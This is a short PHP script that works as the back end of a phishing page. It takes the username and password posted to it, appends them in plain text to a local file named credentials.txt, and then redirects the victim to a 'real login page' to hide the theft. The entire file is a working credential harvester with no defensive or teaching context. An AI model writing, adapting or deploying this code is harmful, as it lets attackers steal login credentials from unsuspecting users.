<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitize inputs
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Append credentials to the file
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n\n");
    fclose($file);

    // Redirect to the real login page
    header("Location: https://realwebsite.com/login");
    exit();
} else {
    // Handle unexpected access
    http_response_code(405);
    echo "Method Not Allowed";
}
?>
